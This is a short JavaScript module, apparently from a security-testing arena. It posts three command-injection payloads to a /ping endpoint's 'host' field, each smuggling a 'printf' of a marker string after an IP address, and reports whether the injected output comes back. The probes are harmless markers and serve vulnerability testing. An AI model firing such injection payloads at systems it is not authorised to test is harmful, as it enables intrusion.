const axios = require('axios');

const MARKER = 'ARENA_CMD_INJECTION_PWNED';
const PAYLOADS = [
  `127.0.0.1; printf ${MARKER}`,
  `127.0.0.1 && printf ${MARKER}`,
  `127.0.0.1$(printf ${MARKER})`,
];

function truncate(value) {
  const text = typeof value === 'string' ? value : JSON.stringify(value);
  return text.length > 200 ? `${text.slice(0, 199)}…` : text;
}

async function runCommandInjectionAttack({ baseUrl }) {
  const start = Date.now();
  const evidence = [];

  for (const host of PAYLOADS) {
    try {
      const response = await axios.post(
        `${baseUrl}/ping`,
        { host },
        {
          headers: { 'Content-Type': 'application/json' },
          timeout: 5000,
          validateStatus: () => true,
        },
      );
      const output = response.data && typeof response.data.output === 'string'
        ? response.data.output
        : '';

      if (response.status === 200 && output.includes(MARKER)) {
        return {
          vulnerability: 'command-injection',
          exploited: true,
          payload: host,
          evidence: truncate(`Injected command output was returned: ${output}`),
          durationMs: Date.now() - start,
        };
      }
      evidence.push(`${host} → ${response.status}`);
    } catch (err) {
      evidence.push(`${host} → ${err.message}`);
    }
  }

  return {
    vulnerability: 'command-injection',
    exploited: false,
    payload: null,
    evidence: truncate(evidence.join('; ')),
    durationMs: Date.now() - start,
  };
}

module.exports = { runCommandInjectionAttack };
